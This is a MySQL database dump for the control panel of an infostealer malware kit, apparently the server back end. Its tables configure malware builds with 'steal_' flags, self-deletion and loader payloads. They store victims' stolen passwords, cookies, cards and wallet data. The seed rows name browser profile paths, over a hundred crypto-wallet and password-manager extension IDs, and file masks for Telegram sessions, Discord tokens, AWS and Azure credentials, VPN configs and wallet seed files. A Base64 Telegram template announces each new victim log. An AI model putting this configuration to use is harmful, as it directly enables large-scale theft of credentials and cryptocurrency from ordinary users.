SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";

CREATE TABLE `blocklist` (
  `id` int NOT NULL,
  `type` enum('ip','mask','hwid') NOT NULL,
  `value` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

CREATE TABLE `browsers` (
  `browser_id` int NOT NULL,
  `name` text NOT NULL,
  `path` text NOT NULL,
  `type` int NOT NULL,
  `soft_path` text NOT NULL,
  `use_v20` int NOT NULL,
  `parse_cookies` tinyint NOT NULL,
  `parse_logins` tinyint NOT NULL,
  `parse_history` tinyint NOT NULL,
  `parse_webdata` tinyint NOT NULL,
  `active` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

INSERT INTO `browsers` (`browser_id`, `name`, `path`, `type`, `soft_path`, `use_v20`, `parse_cookies`, `parse_logins`, `parse_history`, `parse_webdata`, `active`) VALUES
(1, 'Google Chrome', '\\Google\\Chrome\\User Data', 1, 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 1, 1, 1, 0, 1, 1),
(2, 'Chromium', '\\Chromium\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(3, 'Google Chrome Canary', '\\Google\\Chrome SxS\\User Data', 1, '%LOCALAPPDATA%\\Google\\Chrome SxS\\Application\\chrome.exe', 0, 1, 1, 0, 1, 1),
(4, 'Amigo', '\\Amigo\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(5, 'Torch', '\\Torch\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(6, 'Vivaldi', '\\Vivaldi\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(7, 'Comodo Dragon', '\\Comodo\\Dragon\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(8, 'EpicPrivacyBrowser', '\\Epic Privacy Browser\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(9, 'CocCoc', '\\CocCoc\\Browser\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(10, 'Brave', '\\BraveSoftware\\Brave-Browser\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(11, 'Cent Browser', '\\CentBrowser\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(12, '7Star', '\\7Star\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(13, 'Chedot Browser', '\\Chedot\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(14, 'Microsoft Edge', '\\Microsoft\\Edge\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(15, '360 Browser', '\\360Browser\\Browser\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(16, 'QQBrowser', '\\Tencent\\QQBrowser\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(17, 'CryptoTab', '\\CryptoTab Browser\\User Data', 1, 'unk', 0, 1, 1, 0, 1, 1),
(18, 'Opera Stable', '\\Opera Software', 2, 'unk', 0, 1, 1, 0, 1, 1),
(19, 'Mozilla Firefox', '\\Mozilla\\Firefox\\Profiles', 3, 'C:\\Program Files\\Mozilla Firefox\\', 0, 1, 1, 0, 1, 1),
(20, 'Pale Moon', '\\Moonchild Productions\\Pale Moon\\Profiles', 3, 'C:\\Program Files\\Pale Moon\\', 0, 1, 1, 0, 1, 1),
(21, 'Discord', '\\discord\\', 2, 'unk', 0, 0, 0, 0, 0, 1),
(22, 'Thunderbird', '\\Thunderbird\\Profiles', 3, 'C:\\Program Files\\Mozilla Thunderbird\\', 0, 0, 1, 0, 0, 1);

CREATE TABLE `builds` (
  `build_id` int NOT NULL,
  `name` text NOT NULL,
  `password` text NOT NULL,
  `version` text NOT NULL,
  `self_delete` tinyint NOT NULL,
  `take_screenshot` tinyint NOT NULL,
  `block_hwid` tinyint NOT NULL,
  `block_ips` tinyint NOT NULL,
  `loader_before_grabber` tinyint NOT NULL,
  `steal_telegram` tinyint NOT NULL,
  `steal_discord` tinyint NOT NULL,
  `steal_tox` tinyint NOT NULL,
  `steal_pidgin` tinyint NOT NULL,
  `steal_steam` tinyint NOT NULL DEFAULT '0',
  `steal_battlenet` tinyint NOT NULL,
  `steal_uplay` tinyint NOT NULL,
  `steal_protonvpn` tinyint NOT NULL,
  `steal_openvpn` tinyint NOT NULL,
  `steal_outlook` tinyint NOT NULL,
  `steal_thunderbird` tinyint NOT NULL,
  `logs_count` int NOT NULL,
  `created_at` datetime NOT NULL,
  `last_compile` datetime NOT NULL,
  `active` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

CREATE TABLE `downloads` (
  `id` int UNSIGNED NOT NULL,
  `token` varchar(32) NOT NULL,
  `selected_ids` text NOT NULL,
  `status` varchar(20) NOT NULL DEFAULT 'pending',
  `total_files` int UNSIGNED DEFAULT '0',
  `processed_files` int UNSIGNED DEFAULT '0',
  `download_url` varchar(255) DEFAULT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

CREATE TABLE `grabber` (
  `rule_id` int NOT NULL,
  `active` int NOT NULL,
  `name` tinytext COLLATE utf8mb4_general_ci NOT NULL,
  `type` int NOT NULL,
  `csidl` int NOT NULL,
  `start_path` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci,
  `masks` text COLLATE utf8mb4_general_ci NOT NULL,
  `recursive` tinyint NOT NULL,
  `max_size` int NOT NULL,
  `iterations` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

CREATE TABLE `loader` (
  `loader_id` int NOT NULL,
  `active` int NOT NULL,
  `name` text COLLATE utf8mb4_general_ci NOT NULL,
  `url` text COLLATE utf8mb4_general_ci NOT NULL,
  `geo` text COLLATE utf8mb4_general_ci,
  `builds` text COLLATE utf8mb4_general_ci,
  `markers` text COLLATE utf8mb4_general_ci,
  `type` int NOT NULL DEFAULT '0',
  `csidl` int NOT NULL,
  `run_as_admin` int NOT NULL,
  `programs` text COLLATE utf8mb4_general_ci,
  `process` text COLLATE utf8mb4_general_ci,
  `crypto` int NOT NULL DEFAULT '0',
  `load_limit` int NOT NULL,
  `count` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

CREATE TABLE `logs` (
  `log_id` int NOT NULL,
  `build` text NOT NULL,
  `access_token` text NOT NULL,
  `ip` text NOT NULL,
  `iso` char(2) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `date` datetime NOT NULL,
  `last_request` datetime NOT NULL,
  `hwid` text NOT NULL,
  `system` tinytext CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci,
  `architecture` text,
  `decrypt_keys` mediumtext,
  `count_passwords` int NOT NULL,
  `count_cookies` int NOT NULL,
  `count_wallets` int NOT NULL,
  `count_cc` int NOT NULL,
  `array_passwords` longtext,
  `array_cookies` longtext,
  `array_wallets` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci,
  `information` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci,
  `screenshot` int NOT NULL,
  `repeated` int NOT NULL,
  `download` int NOT NULL,
  `favorite` int NOT NULL,
  `comment` text,
  `filename` tinytext CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL,
  `log_info` text,
  `log_status` int NOT NULL,
  `size` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

CREATE TABLE `markers` (
  `rule_id` int NOT NULL,
  `name` text COLLATE utf8mb4_general_ci NOT NULL,
  `urls` longtext COLLATE utf8mb4_general_ci NOT NULL,
  `in_passwords` tinyint NOT NULL,
  `in_cookies` tinyint NOT NULL,
  `color` tinytext COLLATE utf8mb4_general_ci NOT NULL,
  `active` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

CREATE TABLE `plugins` (
  `plugin_id` int NOT NULL,
  `name` text NOT NULL,
  `token` text NOT NULL,
  `from_local` int NOT NULL,
  `from_sync` int NOT NULL,
  `from_IndexedDB` int NOT NULL,
  `active` tinyint NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3;

INSERT INTO `plugins` (`plugin_id`, `name`, `token`, `from_local`, `from_sync`, `from_IndexedDB`, `active`) VALUES
(1, 'MetaMask', 'djclckkglechooblngghdinmeemkbgci', 1, 0, 0, 1),
(2, 'MetaMask', 'ejbalbakoplchlghecdalmeeeajnimhm', 1, 0, 0, 1),
(3, 'MetaMask', 'nkbihfbeogaeaoehlefnkodbefgpgknn', 1, 0, 0, 1),
(4, 'TronLink', 'ibnejdfjmmkpcnlpebklmnkoeoihofec', 1, 0, 0, 1),
(5, 'Binance Wallet', 'fhbohimaelbohpjbbldcngcnapndodjp', 1, 0, 0, 1),
(6, 'Yoroi', 'ffnbelfdoeiohenkjibnmadjiehjhajb', 1, 0, 0, 1),
(7, 'Coinbase Wallet extension', 'hnfanknocfeofbddgcijnmhnfnkdnaad', 1, 0, 1, 1),
(8, 'Guarda', 'hpglfhgfnhbgpjdenjgmdgoeiappafln', 1, 0, 0, 1),
(9, 'Jaxx Liberty', 'cjelfplplebdjjenllpjcblmjkfcffne', 1, 0, 0, 1),
(10, 'iWallet', 'kncchdigobghenbbaddojjnnaogfppfj', 1, 0, 0, 1),
(11, 'MEW CX', 'nlbmnnijcnlegkjjpcfjclmcfggfefdm', 1, 0, 0, 1),
(12, 'GuildWallet', 'nanjmdknhkinifnkgdcggcfnhdaammmj', 1, 0, 0, 1),
(13, 'Ronin Wallet', 'fnjhmkhhmkbjkkabndcnnogagogbneec', 1, 0, 0, 1),
(14, 'NeoLine', 'cphhlgmgameodnhkjdmkpanlelnlohao', 1, 0, 0, 1),
(15, 'CLV Wallet', 'nhnkbkgjikgcigadomkphalanndcapjk', 1, 0, 0, 1),
(16, 'Liquality Wallet', 'kpfopkelmapcoipemfendmdcghnegimn', 1, 0, 0, 1),
(17, 'Terra Station Wallet', 'aiifbnbfobpmeekipheeijimdpnlpgpp', 1, 0, 0, 1),
(18, 'Keplr', 'dmkamcknogkgcdfhhbddcghachkejeap', 1, 0, 0, 1),
(19, 'Sollet', 'fhmfendgdocmcbmfikdcogofphimnkno', 1, 0, 0, 1),
(20, 'Auro Wallet(Mina Protocol)', 'cnmamaachppnkjgnildpdmkaakejnhae', 1, 0, 0, 1),
(21, 'Polymesh Wallet', 'jojhfeoedkpkglbfimdfabpdfjaoolaf', 1, 0, 0, 1),
(22, 'ICONex', 'flpiciilemghbmfalicajoolhkkenfel', 1, 0, 0, 1),
(23, 'Coin98 Wallet', 'aeachknmefphepccionboohckonoeemg', 1, 0, 0, 1),
(24, 'EVER Wallet', 'cgeeodpfagjceefieflmdfphplkenlfk', 1, 0, 0, 1),
(25, 'KardiaChain Wallet', 'pdadjkfkgcafgbceimcpbkalnfnepbnk', 1, 0, 0, 1),
(26, 'Rabby', 'acmacodkjbdgmoleebolmdjonilkdbch', 1, 0, 0, 1),
(27, 'Phantom', 'bfnaelmomeimhlpmgjnjophhpkkoljpa', 1, 0, 0, 1),
(28, 'Brave Wallet', 'odbfpeeihdkbihmopkbjmoonfanlbfcl', 1, 0, 0, 1),
(29, 'Oxygen', 'fhilaheimglignddkjgofkcbgekhenbh', 1, 0, 0, 1),
(30, 'Pali Wallet', 'mgffkfbidihjpoaomajlbgchddlicgpn', 1, 0, 0, 1),
(31, 'BOLT X', 'aodkkagnadcbobfpggfnjeongemjbjca', 1, 0, 0, 1),
(32, 'XDEFI Wallet', 'hmeobnfnfcmdkdcmlblgagmfpfboieaf', 1, 0, 0, 1),
(33, 'Nami', 'lpfcbjknijpeeillifnkikgncikgfhdo', 1, 0, 0, 1),
(34, 'Maiar DeFi Wallet', 'dngmlblcodfobpdpecaadgfbcggfjfnm', 1, 0, 0, 1),
(35, 'Keeper Wallet', 'lpilbniiabackdjcionkobglmddfbcjo', 1, 0, 0, 1),
(36, 'Solflare Wallet', 'bhhhlbepdkbapadjdnnojkbgioiodbic', 1, 0, 0, 1),
(37, 'Cyano Wallet', 'dkdedlpgdmmkkfjabffeganieamfklkm', 1, 0, 0, 1),
(38, 'KHC', 'hcflpincpppdclinealmandijcmnkbgn', 1, 0, 0, 1),
(39, 'TezBox', 'mnfifefkajgofkcjkemidiaecocnkjeh', 1, 0, 0, 1),
(40, 'Temple', 'ookjlbkiijinhpmnjffcofjonbfbgaoc', 1, 0, 0, 1),
(41, 'Goby', 'jnkelfanjkeadonecabehalmbgpfodjm', 1, 0, 0, 1),
(42, 'Ronin Wallet', 'kjmoohlgokccodicjjfebfomlbljgfhk', 1, 0, 0, 1),
(43, 'Byone', 'nlgbhdfgdhgbiamfdfmbikcdghidoadd', 1, 0, 0, 1),
(44, 'OneKey', 'jnmbobjmhlngoefaiojfljckilhhlhcj', 1, 0, 0, 1),
(45, 'DAppPlay', 'lodccjjbdhfakaekdiahmedfbieldgik', 1, 0, 0, 1),
(46, 'SteemKeychain', 'jhgnbkkipaallpehbohjmkbjofjdmeid', 1, 0, 0, 1),
(47, 'Braavos Wallet', 'jnlgamecbpmbajjfhmmmlhejkemejdma', 1, 0, 0, 1),
(48, 'Enkrypt', 'kkpllkodjeloidieedojogacfhpaihoh', 1, 1, 1, 1),
(49, 'OKX Wallet', 'mcohilncbfahbmgdjkbpemcciiolgcge', 1, 0, 0, 1),
(50, 'Sender Wallet', 'epapihdplajcdnnkdeiahlgigofloibg', 1, 0, 0, 1),
(51, 'Hashpack', 'gjagmgiddbbciopjhllkdnddhcglnemk', 1, 0, 0, 1),
(52, 'Eternl', 'kmhcihpebfmpgmihbkipmjlmmioameka', 1, 0, 0, 1),
(53, 'Pontem Aptos Wallet', 'phkbamefinggmakgklpkljjmgibohnba', 1, 0, 0, 1),
(54, 'Petra Aptos Wallet', 'ejjladinnckdgjemekebdpeokbikhfci', 1, 0, 0, 1),
(55, 'Martian Aptos Wallet', 'efbglgofoippbgcjepnhiblaibcnclgk', 1, 0, 0, 1),
(56, 'Finnie', 'cjmkndjhnagcfbpiemnkdpomccnjblmj', 1, 0, 0, 1),
(57, 'Leap Terra Wallet', 'aijcbedoijmgnlmjeegjaglmepbmpkpi', 1, 0, 0, 1),
(58, 'Trezor Password Manager', 'imloifkgjagghnncjkhggdhalmcnfklk', 1, 0, 0, 1),
(59, 'Authenticator', 'bhghoamapcdpbohphigoooaddinpkbai', 1, 0, 0, 1),
(60, 'Authy', 'gaedmjdfmmahhbjefcbgaolhhanlaolb', 1, 0, 0, 1),
(61, 'EOS Authenticator', 'oeljdldpnmdbchonielidgobddffflal', 1, 0, 0, 1),
(62, 'GAuth Authenticator', 'ilgcnhelpchnceeipipijaljkblbcobl', 1, 0, 0, 1),
(63, 'Bitwarden', 'nngceckbapebfimnlniiiahkandclblb', 1, 0, 0, 1),
(64, 'KeePassXC', 'oboonakemofpalcgghocfoadofidjkkk', 1, 0, 0, 1),
(65, 'Dashlane', 'fdjamakpfbbddfjaooikfcpapjohcfmg', 1, 0, 0, 1),
(66, 'NordPass', 'fooolghllnmhmmndgjiamiiodkpenpbb', 1, 0, 0, 1),
(67, 'Keeper', 'bfogiafebfohielmmehodmfbbebbbpei', 1, 0, 0, 1),
(68, 'RoboForm', 'pnlccmojcmeohlpggmfnbbiapkmbliob', 1, 0, 0, 1),
(69, 'LastPass', 'hdokiejnpimakedhajhdlcegeplioahd', 1, 0, 0, 1),
(70, 'BrowserPass', 'naepdomgkenhinolocfifgehidddafch', 1, 0, 0, 1),
(71, 'MYKI', 'bmikpgodpkclnkgmnpphehdgcimmided', 1, 0, 0, 1),
(72, 'Splikity', 'jhfjfclepacoldmjmkmdlmganfaalklb', 1, 0, 0, 1),
(73, 'CommonKey', 'chgfefjpcobfbnpmiokfjjaglahmnded', 1, 0, 0, 1),
(74, 'Zoho Vault', 'igkpcodhieompeloncfnbekccinhapdb', 1, 0, 0, 1),
(75, 'Opera Wallet', 'gojhcdgcpbpfigcaejpfhfegekdgiblk', 1, 0, 1, 1),
(76, 'Trust Wallet', 'egjidjbpglichdcondbcbdnbeeppgdph', 1, 0, 0, 1),
(77, 'Rise - Aptos Wallet', 'hbbgbephgojikajhfbomhlmmollphcad', 1, 0, 0, 1),
(78, 'Rainbow Wallet', 'opfgelmcmbiajamepnmloijbpoleiama', 1, 0, 0, 1),
(79, 'Nightly Wallet', 'fiikommddbeccaoicoejoniammnalkfa', 1, 0, 0, 1),
(80, 'Ecto Wallet', 'bgjogpoidejdemgoochpnkmdjpocgkha', 1, 0, 0, 1),
(81, 'Coinhub', 'jgaaimajipbpdogpdglhaphldakikgef', 1, 0, 0, 1),
(82, 'MultiversX DeFi Wallet', 'dngmlblcodfobpdpecaadgfbcggfjfnm', 1, 0, 0, 1),
(83, 'Frontier Wallet', 'kppfdiipphfccemcignhifpjkapfbihd', 1, 0, 0, 1),
(84, 'SafePal', 'lgmpcpglpngdoalbgeoldeajfclnhafa', 1, 0, 0, 1),
(85, 'SubWallet - Polkadot Wallet', 'onhogfjeacnfoofkfgppdlbmlmnplgbn', 1, 0, 0, 1),
(86, 'Fluvi Wallet', 'mmmjbcfofconkannjonfmjjajpllddbg', 1, 0, 0, 1),
(87, 'Glass Wallet - Sui Wallet', 'loinekcabhlmhjjbocijdoimmejangoa', 1, 0, 0, 1),
(88, 'Morphis Wallet', 'heefohaffomkkkphnlpohglngmbcclhi', 1, 0, 0, 1),
(89, 'Xverse Wallet', 'idnnbdplmphpflfnlkomgpfbpcgelopg', 1, 0, 0, 1),
(90, 'Compass Wallet for Sei', 'anokgmphncpekkhclmingpimjmcooifb', 1, 0, 0, 1),
(91, 'HAVAH Wallet', 'cnncmdhjacpkmjmkcafchppbnpnhdmon', 1, 0, 0, 1),
(92, 'Elli - Sui Wallet', 'ocjdpmoallmgmjbbogfiiaofphbjgchh', 1, 0, 0, 1),
(93, 'Venom Wallet', 'ojggmchlghnjlapmfbnjholfjkiidbch', 1, 0, 0, 1),
(94, 'Pulse Wallet Chromium', 'ciojocpkclfflombbcfigcijjcbkmhaf', 1, 0, 0, 1),
(95, 'Magic Eden Wallet', 'mkpegjkblkkefacfnmkajcjmabijhclg', 1, 0, 0, 1),
(96, 'Backpack Wallet', 'aflkmfhebedbjioipglgcbcmnbpgliof', 1, 0, 0, 1),
(97, 'Tonkeeper Wallet', 'omaabbefbmiijedngplfjmnooppbclkk', 1, 0, 0, 1),
(98, 'OpenMask Wallet', 'penjlddjkjgpnkllboccdgccekpkcbin', 1, 0, 0, 1),
(99, 'SafePal Wallet', 'apenkfbbpmhihehmihndmmcdanacolnh', 1, 0, 0, 1),
(100, 'Bitget Wallet', 'jiidiaalihmmhddjgbnbgdfflelocpak', 1, 0, 0, 1),
(101, 'TON Wallet', 'nphplpgoakhhjchkkhmiggakijnkhfnd', 1, 0, 0, 1),
(102, 'MyTonWallet', 'fldfpgipfncgndfolcbkdeeknbbbnhcc', 1, 0, 0, 1),
(103, 'Uniswap Extension', 'nnpmfplkfogfpmcngplhnbdnnilmcdcg', 1, 0, 0, 1);

CREATE TABLE `programs` (
  `rule_id` int NOT NULL,
  `active` int NOT NULL,
  `name` tinytext COLLATE utf8mb4_general_ci NOT NULL,
  `type` int NOT NULL,
  `csidl` int NOT NULL,
  `start_path` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci,
  `masks` text COLLATE utf8mb4_general_ci NOT NULL,
  `recursive` tinyint NOT NULL,
  `max_size` int NOT NULL,
  `iterations` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

INSERT INTO `programs` (`rule_id`, `active`, `name`, `type`, `csidl`, `start_path`, `masks`, `recursive`, `max_size`, `iterations`) VALUES
(1, 1, 'Telegram', 3, 1, '\\Telegram Desktop\\', 'key_datas,map*,A7FDF864FBC10B77*,D877F783D5D3EF8C*,A92DAA6EA6F891F2*,F8806DD0C461824F*', 1, 0, 10),
(2, 1, 'Discord', 3, 1, '\\discord\\Local Storage\\leveldb\\', '*.*', 0, 0, 1),
(3, 1, 'Azure\\.azure', 3, 3, '\\.azure\\', '*.*', 1, 0, 0),
(4, 1, 'Azure\\.aws', 3, 3, '\\.aws\\', '*.*', 1, 0, 0),
(5, 1, 'Azure\\.IdentityService', 3, 3, '\\.IdentityService\\', 'msal.cache', 0, 0, 1),
(6, 1, 'Tox', 3, 1, '\\Tox\\', '*.tox,*.ini', 0, 0, 1),
(7, 1, 'Pidgin', 3, 1, '\\.purple\\', 'accounts.xml', 0, 0, 1),
(8, 1, 'Uplay', 3, 0, '\\Ubisoft Game Launcher\\', '*.*', 1, 0, 5),
(9, 1, 'Battle.Net', 3, 1, '\\Battle.net\\', '*.db,*.config', 1, 0, 5),
(10, 1, 'OpenVPN', 3, 1, '\\OpenVPN Connect\\profiles\\', '*ovpn*.*,*.*ovpn*', 1, 0, 5),
(11, 1, 'ProtonVPN', 3, 0, '\\ProtonVPN\\', 'user.config', 1, 0, 5);

CREATE TABLE `settings` (
  `setting_key` varchar(255) NOT NULL,
  `setting_value` text
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

INSERT INTO `settings` (`setting_key`, `setting_value`) VALUES
('telegram_bot_username', ''),
('telegram_chat_ids', ''),
('telegram_message', 'RG9uZSB1cGxvYWRpbmcgI2xvZ18lSUQlCgpJUDogJUlQJQpDb3VudHJ5OiAlQ09VTlRSWSUKCjxiPlN1bW1hcnk6PC9iPgrwn5SRJUNPVU5UX1BBU1NXT1JEUyUg8J+NqiVDT1VOVF9DT09LSUVTJSDwn5K4JUNPVU5UX1dBTExFVFMlCgo8Yj5CdWlsZDo8L2I+ICVCVUlMRCUKCvCfk4YlREFURSUKCvCflqUlT1MlCjxiPkhXSUQ6PC9iPiAlSFdJRCUKPGI+RHVwbGljYXRlOjwvYj4gJVJFUEVBVEVEJQoKPGI+V2FsbGV0czo8L2I+CiVXQUxMRVRTX0xJU1QlCgo8Yj5NYXJrZXJzOjwvYj4KJU1BUktFUlNfTElTVCUKCjxiPkRvd25sb2FkOjwvYj4gJURPV05MT0FEX1VSTCU='),
('telegram_token', '');

CREATE TABLE `users` (
  `id` int NOT NULL,
  `active` int NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `builds` text,
  `user_group` enum('Worker','Administrator') CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL DEFAULT 'Worker',
  `theme` int NOT NULL DEFAULT '0',
  `twofa_status` int NOT NULL,
  `twofa_secret` varchar(255) DEFAULT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `last_login` datetime DEFAULT NULL,
  `telegram_enable` int NOT NULL DEFAULT '0',
  `chat_id` bigint DEFAULT NULL,
  `notify_logins` int NOT NULL DEFAULT '0',
  `notify_twofa_change` int NOT NULL DEFAULT '0',
  `notify_password_change` int NOT NULL DEFAULT '0',
  `notify_all_logs` int NOT NULL DEFAULT '0',
  `notify_only_crypto_logs` int NOT NULL DEFAULT '0',
  `notify_with_screen` int NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

INSERT INTO `users` (`id`, `active`, `username`, `password`, `builds`, `user_group`, `theme`, `twofa_status`, `twofa_secret`, `created_at`, `last_login`, `telegram_enable`, `chat_id`, `notify_logins`, `notify_twofa_change`, `notify_password_change`, `notify_all_logs`, `notify_only_crypto_logs`, `notify_with_screen`) VALUES
(2, 1, 'admin', '$2y$10$kbA.nM7lYhOGrMeAukvYdeLTjYo2ozELK9NJ1v35R6z69R6sOxokm', '', 'Administrator', 0, 0, '64FZVHUV4SV7P5WT', NOW(), NOW(), 0, 0, 0, 0, 0, 0, 0, 0);

CREATE TABLE `users_sessions` (
  `id` int NOT NULL,
  `session_id` varchar(255) NOT NULL,
  `user_id` int NOT NULL,
  `user_agent` varchar(255) NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `last_activity` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

CREATE TABLE `users_tokens` (
  `id` int NOT NULL,
  `user_id` int NOT NULL,
  `token` varchar(64) NOT NULL,
  `expires_at` datetime NOT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

CREATE TABLE `versions` (
  `id` int NOT NULL,
  `version` varchar(255) COLLATE utf8mb4_general_ci NOT NULL,
  `changes` text COLLATE utf8mb4_general_ci,
  `created_at` datetime NOT NULL,
  `zip_file` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

CREATE TABLE `wallets` (
  `rule_id` int NOT NULL,
  `active` tinyint NOT NULL,
  `name` tinytext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `type` int NOT NULL,
  `csidl` int NOT NULL,
  `start_path` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci,
  `masks` text COLLATE utf8mb4_general_ci NOT NULL,
  `recursive` tinyint NOT NULL,
  `max_size` int NOT NULL,
  `iterations` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

INSERT INTO `wallets` (`rule_id`, `active`, `name`, `type`, `csidl`, `start_path`, `masks`, `recursive`, `max_size`, `iterations`) VALUES
(1, 1, 'Bitcoin Core', 1, 1, '\\Bitcoin\\', '*wallet*.dat', 1, 0, 0),
(2, 1, 'Dogecoin', 1, 1, '\\Dogecoin\\', '*wallet*.dat', 1, 0, 0),
(3, 1, 'Raven Core', 1, 1, '\\Raven\\', '*wallet*.dat', 1, 0, 0),
(4, 1, 'Daedalus Mainnet', 1, 1, '\\Daedalus Mainnet\\wallets\\', 'she*.sqlite', 1, 0, 0),
(5, 1, 'Blockstream Green', 1, 1, '\\Blockstream\\Green\\wallets\\', '*.*', 1, 0, 0),
(6, 1, 'Wasabi Wallet', 1, 1, '\\WalletWasabi\\Client\\Wallets\\', '*.json', 1, 0, 0),
(7, 1, 'Ethereum', 1, 1, '\\Ethereum\\', 'keystore', 0, 0, 0),
(8, 1, 'Electrum', 1, 1, '\\Electrum\\wallets\\', '*.*', 0, 0, 0),
(9, 1, 'ElectrumLTC', 1, 1, '\\Electrum-LTC\\wallets\\', '*.*', 0, 0, 0),
(10, 1, 'Ledger Live\\Local Storage\\leveldb', 1, 1, '\\Ledger Live\\Local Storage\\leveldb\\', '*.*', 0, 0, 0),
(12, 1, 'Ledger Live', 1, 1, '\\Ledger Live\\', '*.*', 0, 0, 0),
(13, 1, 'Exodus', 1, 1, '\\Exodus\\', 'exodus.conf.json,window-state.json', 0, 0, 0),
(14, 1, 'Exodus\\exodus.wallet', 1, 1, '\\Exodus\\exodus.wallet', 'passphrase.json,seed.seco,info.seco', 0, 0, 0),
(15, 1, 'Electron Cash', 1, 1, '\\ElectronCash\\wallets\\', '*.*', 0, 0, 0),
(16, 1, 'MultiDoge', 1, 1, '\\MultiDoge\\', 'multidoge.wallet', 0, 0, 0),
(17, 1, 'Jaxx Desktop', 1, 1, '\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\', '*.*', 0, 0, 0),
(18, 1, 'Atomic', 1, 1, '\\atomic\\Local Storage\\leveldb\\', '*.*', 0, 0, 0),
(19, 1, 'Binance', 1, 1, '\\Binance\\', 'app-store.json,simple-storage.json,.finger-print.fp', 0, 0, 0),
(20, 1, 'Coinomi', 1, 1, '\\Coinomi\\Coinomi\\wallets\\', '*.wallet,*.config', 1, 0, 0),
(21, 1, 'Chia Wallet\\config', 1, 3, '\\.chia\\mainnet\\config\\', '*.*', 1, 0, 0),
(22, 1, 'Chia Wallet\\run', 1, 3, '\\.chia\\mainnet\\run\\', '*.*', 1, 0, 0),
(23, 1, 'Chia Wallet\\wallet', 1, 3, '\\.chia\\mainnet\\wallet\\', '*.*', 1, 0, 0),
(24, 1, 'Komodo Wallet\\config', 1, 1, '\\atomic_qt\\config\\', '*.*', 1, 0, 0),
(25, 1, 'Komodo Wallet\\exports', 1, 1, '\\atomic_qt\\exports\\', '*.*', 1, 0, 0),
(26, 1, 'Guarda Desktop\\IndexedDB\\https_guarda.co_0.indexeddb.leveldb', 1, 1, '\\Guarda\\IndexedDB\\https_guarda.co_0.indexeddb.leveldb\\', '*.*', 1, 0, 0),
(27, 1, 'Guarda Desktop\\Local Storage\\leveldb', 1, 1, '\\Guarda\\Local Storage\\leveldb\\', '*.*', 1, 0, 0);

ALTER TABLE `blocklist`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `browsers`
  ADD PRIMARY KEY (`browser_id`);

ALTER TABLE `builds`
  ADD PRIMARY KEY (`build_id`);

ALTER TABLE `downloads`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `token` (`token`);

ALTER TABLE `grabber`
  ADD PRIMARY KEY (`rule_id`);

ALTER TABLE `loader`
  ADD PRIMARY KEY (`loader_id`);

ALTER TABLE `logs`
  ADD PRIMARY KEY (`log_id`);

ALTER TABLE `markers`
  ADD PRIMARY KEY (`rule_id`);

